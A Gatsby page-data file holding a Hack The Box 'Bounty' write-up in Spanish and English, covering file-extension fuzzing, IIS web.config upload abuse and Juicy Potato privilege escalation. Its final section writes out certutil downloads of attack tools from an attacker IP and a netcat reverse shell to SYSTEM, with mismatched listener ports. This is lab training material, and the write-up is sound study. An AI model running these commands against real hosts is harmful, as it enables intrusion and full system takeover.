{"componentChunkName":"component---node-modules-gatsby-theme-portfolio-minimal-src-templates-article-index-tsx","path":"/htb-bounty/","result":{"pageContext":{"article":{"banner":{"alt":"Really close pic of one eye","caption":"Photo by <a href=\"https://unsplash.com/@v2osk\">v2osk</a> on Unsplash","src":{"childImageSharp":{"gatsbyImageData":{"layout":"constrained","placeholder":{"fallback":"data:image/jpeg;base64,/9j/2wBDAAEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQH/2wBDAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQH/wgARCAAMABQDASIAAhEBAxEB/8QAGAAAAgMAAAAAAAAAAAAAAAAAAAcECAn/xAAVAQEBAAAAAAAAAAAAAAAAAAAFBv/aAAwDAQACEAMQAAABoOxEhpJMNOIkFQF//8QAGRABAAMBAQAAAAAAAAAAAAAABAIFBgMH/9oACAEBAAEFAlC5W22JqYZjQFw9PeHIvsn0XOkIlU9VaEh//8QAIhEAAgEDBAIDAAAAAAAAAAAAAQIDERITAAQFIhRxITKB/9oACAEDAQE/AfLePkOSWVmaUZprqI6GJC2SMBgrozU+wY9bRRbRp95yF7493MiXGxM0nVa/C/g9ehr/xAAgEQACAgEDBQAAAAAAAAAAAAABAgMREgAEEyIxMnGB/9oACAECAQE/Ad6grZSMuUDtFGEV5IpFnlCcMhZSyOkd3jgCGs210NuIzBEXijZuNcm406jQs+J7+z91/8QAJRAAAgEDAwQCAwAAAAAAAAAAAQIDBBESAAUhFCIjMxMxFUFR/9oACAEBAAY/At7NcYrbVLSUFJEyeBU+FOePXkXzEuDLkfrVBsk23DceuaPzPTQSBkq5GjgRosF6lFY+UwqCALhy19RV9XssIqHXCTpKSkiiJjJF8Sb3t/bduItxqT5SD+Shgeq/WTrBGAy89rdg5+9KZ6aCR4FkeGV4kaaFosADFMwMsdwxyCMAdU0UIplTpo29THuYtc+zX//EABwQAQEBAQACAwAAAAAAAAAAAAERIQAxQVFhcf/aAAgBAQABPyExTX/FzKxOUjEo5oVgl+tsE6SdierpGE2gYYIwdMNHA/QBAU3HnlG5JSnDDBkIBOqWhFTRF+IH4Huvf//aAAwDAQACAAMAAAAQfM//xAAXEQEBAQEAAAAAAAAAAAAAAAABEQAx/9oACAEDAQE/EJQYkU9bCgDekMUh5g5LJoNAoBjAYf/EABcRAQEBAQAAAAAAAAAAAAAAAAERIQD/2gAIAQIBAT8QQICZWajAnGPcbT6osdRTTdTdUK//xAAYEAEBAQEBAAAAAAAAAAAAAAABEQAhMf/aAAgBAQABPxCyzoDRbso5g+BsbYejpnEEkYdcJmOtyi5lK4uBdJKBVKCdwq6qXrVp+PZYDsdmEn4U1Y/D1Wj/2Q=="},"images":{"fallback":{"src":"/static/e128430a92a84af91cb7b674d9245937/91671/eye.jpg","srcSet":"/static/e128430a92a84af91cb7b674d9245937/7e3b4/eye.jpg 165w,\n/static/e128430a92a84af91cb7b674d9245937/47f88/eye.jpg 330w,\n/static/e128430a92a84af91cb7b674d9245937/91671/eye.jpg 660w,\n/static/e128430a92a84af91cb7b674d9245937/5aaff/eye.jpg 1320w","sizes":"(min-width: 660px) 660px, 100vw"},"sources":[{"srcSet":"/static/e128430a92a84af91cb7b674d9245937/322ad/eye.webp 165w,\n/static/e128430a92a84af91cb7b674d9245937/de3b3/eye.webp 330w,\n/static/e128430a92a84af91cb7b674d9245937/2b2b5/eye.webp 660w,\n/static/e128430a92a84af91cb7b674d9245937/e36a7/eye.webp 1320w","type":"image/webp","sizes":"(min-width: 660px) 660px, 100vw"}]},"width":660,"height":400}}}},"body":"<h1>Que aprendi de la maquina Bounty</h1>\n<p>En esta maquina podemos ver varias cosas muy comunes y que a la vez me frustran muchisimo cuando las olvido:</p>\n<ol>\n<li>Rabbit Holes</li>\n<li>Fuzzing de archivos</li>\n</ol>\n<p>Tambien aprendemos fragilidades del IIS, como ser el <code class=\"language-text\">web.config</code> y subidas de archivos que permitan la extension <code class=\"language-text\">.config</code>.</p>\n<p>It is very similar to a .htaccess file in Apache web server. Uploading a .htaccess file to bypass protections around the uploaded files is a known technique.</p>\n<h2>Mal Fuzzing</h2>\n<h3><code class=\"language-text\">archivo.ext</code></h3>\n<p>Fuzzear mal provoca problemas como perder de vista vias de explotacion, perder tiempo, nos anula la entrada potencial a la victima, y nos provoca un falso negativo, es decir que creemos que no existe modo de aproximacion posible, cuando en realidad no aplicamos bien el concepto de Fuzzear.</p>\n<p>No ser detallista a la hora de considerar el OS victima y no hacer una investigacion rapida sobre los archivos que utiliza el sistema segun el lenguaje que usa el sistema, y sumado a una completa subestimacion de la importancia de fuzzear <code class=\"language-text\">archivo.ext</code> durante el testeo, me condujeron a un falso negativo.</p>\n<h3>wordlist incorrecta</h3>\n<p>Otras de las cosas que me gusta subestimar es la propia wordlist. Si bien hay muchas wordlists, hacer una pequenia busqueda de wordlists empezando por su propio nombre puede ser la diferencia entre resolver una maquina o no.</p>\n<p>Hay listas genericas para servidores, como la lista con la <code class=\"language-text\">common.txt</code> que descubre el folder del IIS <code class=\"language-text\">uploadedfiles</code>. La lista <code class=\"language-text\">raft-large-extensions-lowercase.txt</code> con la que descubrimos las extensiones, y aqui vemos tambien la importancia de esforzarnos minimamente en elegir nuestra lista de fuzzeo por algunos detalles que menciono a continuacion.</p>\n<h4>wordlist-blabla-lowercase.txt</h4>\n<p>Si buscamos fuzzear extensiones pero no buscamos validar si el servidor interpreta la misma extension de un modo distinto si es Mayus/Minus, la wordlist <code class=\"language-text\">web-extensions-big.txt</code> no es la indicada, por mas que tenga 66885 lineas y eso nos de una sensacion de infalibilidad.</p>\n<p>Entonces, vemos que <em>\"lowercase\"</em> significa eso, que no habra variantes Mayus/Minus de la misma extension, y si bien puede que no esten todas, puede tambien que esten las suficientes.</p>\n<p>Si analizamos desde esta optica, vemos que no hay muchas que sean lower case (minusculas), en realidad solo hay dos, y si queremos apuntar a una mayor covertura, eso nos deja solo una:</p>\n<div class=\"gatsby-highlight\" data-language=\"sh\"><pre class=\"language-sh\"><code class=\"language-sh\">└─$ <span class=\"token function\">locate</span> /usr/share/wordlists/SecLists *.txt <span class=\"token operator\">|</span> <span class=\"token function\">grep</span> extension <span class=\"token operator\">|</span> <span class=\"token function\">grep</span> lower  \n/usr/share/wordlists/SecLists/Discovery/Web-Content/raft-large-extensions-lowercase.txt\n/usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-extensions-lowercase.txt\n/usr/share/wordlists/SecLists/Discovery/Web-Content/raft-small-extensions-lowercase.txt\n/usr/share/wordlists/SecLists/Fuzzing/file-extensions-lower-case.txt\n\n└─$ <span class=\"token function\">cat</span> /usr/share/wordlists/SecLists/Fuzzing/file-extensions-lower-case.txt <span class=\"token operator\">|</span> <span class=\"token function\">wc</span> <span class=\"token parameter variable\">-l</span>      \n<span class=\"token number\">769</span>\n\n└─$ <span class=\"token function\">cat</span> /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-large-extensions-lowercase.txt <span class=\"token operator\">|</span> <span class=\"token function\">wc</span> <span class=\"token parameter variable\">-l</span>\n<span class=\"token number\">2367</span></code></pre></div>\n<blockquote>\n<p>Las listas mencionadas se encuentran en <code class=\"language-text\">SecLists/Discovery/Web-Content/</code></p>\n</blockquote>\n<h3>Fuzzing mal aplicado</h3>\n<p>Si bien podriamos pensar que fuzzear con wffuz <code class=\"language-text\">archivo.ext</code> para buscar vias potenciales de explotacion de un servidor seria una via valida de reconocimiento, si el archivo de extensiones es muy grande se vuelve ineficiente. Y por el tiempo que llevaria llegar a un archivo.ext util quiza cancelemos el proceso antes de llegar a el.</p>\n<p>Por ello, seria mejor no pasar por alto el OS del servidor, y fuzzear archivos con una pequenia lista de extensiones basada en el lenguaje que usa su sistema. El comando que podriamos usar para ello seria el siguiente:</p>\n<div class=\"gatsby-highlight\" data-language=\"sh\"><pre class=\"language-sh\"><code class=\"language-sh\">wfuzz <span class=\"token parameter variable\">-u</span> http://target.vict/FUZZ.FUZ2Z <span class=\"token parameter variable\">-w</span> wordlist.txt <span class=\"token parameter variable\">-z</span> list,asp-aspx <span class=\"token parameter variable\">--hc</span> <span class=\"token number\">404</span> </code></pre></div>\n<h2>Escalation of Privilege with Juicy Potato + Netcat for reverse shell</h2>\n<h3>Dangerous Privileges</h3>\n<div class=\"gatsby-highlight\" data-language=\"ps\"><pre class=\"language-ps\"><code class=\"language-ps\">whoami /priv</code></pre></div>\n<ol>\n<li>SeImpersonatePrivilege\n<ol>\n<li>Juicy Potato\n<ol>\n<li>Alternativas\n<ol>\n<li>(En algunos no funcionara, pero hay un modo alternativo con PIPES - pipeserverimpoersonate) (quiza sea el Windows Server 2019)</li>\n</ol>\n</li>\n<li>Fallos\n<ol>\n<li>Por default Juicy Potato utiliza un CLSID, pero si falla se pueden utilzar otros segun sea la version del sistema (systeminfo)</li>\n</ol>\n</li>\n<li>Versiones\n<ol>\n<li>Windows 2008 es vulnerable al EternalBlue, se podria subir chisel para para hacer un port forwarding exponiendo el puerto 445 y atacarlo</li>\n</ol>\n</li>\n</ol>\n</li>\n</ol>\n</li>\n</ol>\n<h3>How-to attack</h3>\n<ol>\n<li>Download Juicy Potato (fresh potatoes > JuicyPotato.exe)\n<ol>\n<li><a href=\"https://ohpe.github.io/juicy-potato/\">https://ohpe.github.io/juicy-potato/</a></li>\n</ol>\n</li>\n<li>Download Netcat for Windows (v1.12)\n<ol>\n<li><a href=\"https://eternallybored.org/misc/netcat/\">https://eternallybored.org/misc/netcat/</a></li>\n</ol>\n</li>\n</ol>\n<div class=\"gatsby-highlight\" data-language=\"sh\"><pre class=\"language-sh\"><code class=\"language-sh\"><span class=\"token function\">unzip</span> netcat.zip <span class=\"token parameter variable\">-d</span> netcat\n<span class=\"token function\">mv</span> netcat/nc64.exe <span class=\"token builtin class-name\">.</span>\n\n<span class=\"token comment\"># verify</span>\n└─$ <span class=\"token function\">ls</span>\nnc64.exe JuicyPotato.exe\n\n<span class=\"token comment\"># Create a Python server to share the files with Windows Victim</span>\n└─$ python <span class=\"token parameter variable\">-m</span> http.server <span class=\"token number\">80</span>\n<span class=\"token comment\"># Create a Netcat listener in the Kali Attacker</span>\n└─$ <span class=\"token function\">nc</span> <span class=\"token parameter variable\">-lvnp</span> <span class=\"token number\">9191</span>\n<span class=\"token comment\"># Request the files from Windows Victim</span>\nPS C:<span class=\"token punctuation\">\\</span>Windows<span class=\"token punctuation\">\\</span>Temp<span class=\"token punctuation\">\\</span>Privesc<span class=\"token operator\">></span> certutil.exe <span class=\"token parameter variable\">-f</span> <span class=\"token parameter variable\">-urlcache</span> <span class=\"token parameter variable\">-split</span> http://10.10.14.8/JuicyPotato.exe JuicyPotato.exe\nPS C:<span class=\"token punctuation\">\\</span>Windows<span class=\"token punctuation\">\\</span>Temp<span class=\"token punctuation\">\\</span>Privesc<span class=\"token operator\">></span> certutil.exe <span class=\"token parameter variable\">-f</span> <span class=\"token parameter variable\">-urlcache</span> <span class=\"token parameter variable\">-split</span> http://10.10.14.8/nc64.exe nc64.exe\n\n<span class=\"token comment\"># verify</span>\nPS C:<span class=\"token punctuation\">\\</span>Windows<span class=\"token punctuation\">\\</span>Temp<span class=\"token punctuation\">\\</span>Privesc<span class=\"token operator\">></span> <span class=\"token function\">dir</span>\nMode                LastWriteTime     Length Name                              \n----                -------------     ------ ----                              \n-a---         <span class=\"token number\">12</span>/2/2025  <span class=\"token number\">11</span>:12 PM     <span class=\"token number\">347648</span> JuicyPotato.exe                   \n-a---         <span class=\"token number\">12</span>/2/2025  <span class=\"token number\">11</span>:12 PM      <span class=\"token number\">45272</span> nc64.exe                          \n\n<span class=\"token comment\"># Reverse Shell</span>\nPS C:<span class=\"token punctuation\">\\</span>Windows<span class=\"token punctuation\">\\</span>Temp<span class=\"token punctuation\">\\</span>Privesc<span class=\"token operator\">></span> .<span class=\"token punctuation\">\\</span>JuicyPotato.exe <span class=\"token parameter variable\">-t</span> * <span class=\"token parameter variable\">-p</span> C:<span class=\"token punctuation\">\\</span>Windows<span class=\"token punctuation\">\\</span>System32<span class=\"token punctuation\">\\</span>cmd.exe <span class=\"token parameter variable\">-l</span> <span class=\"token number\">9191</span> <span class=\"token parameter variable\">-a</span> <span class=\"token string\">\"/c C:\\Windows\\Temp\\Privesc<span class=\"token entity\" title=\"\\n\">\\n</span>c64.exe -e cmd 10.10.14.8 9292\"</span>\n\n<span class=\"token comment\"># the Kali Attacker Netcat listener \"nc -lvnp 9191\"</span>\nC:<span class=\"token punctuation\">\\</span>Windows<span class=\"token punctuation\">\\</span>system3<span class=\"token operator\"><span class=\"token file-descriptor important\">2</span>></span>whoami\nnt authority<span class=\"token punctuation\">\\</span>system</code></pre></div>","categories":["Fuzzing","Web Server","tool","Juicy Potato"],"date":"November 29, 2025","description":"Microsoft-IIS/7.5 & Juicy Potato","id":"89780a96-a8db-5ee5-a5cf-154e2584daac","keywords":["Fuzzing","Web Server","tool","Juicy Potato"],"slug":"/htb-bounty/","title":"Microsoft-IIS/7.5 & Juicy Potato","readingTime":{"text":"4 min read"}},"listingPagePath":"/blog"}},"staticQueryHashes":["3262260831","948380417"],"slicesMap":{}}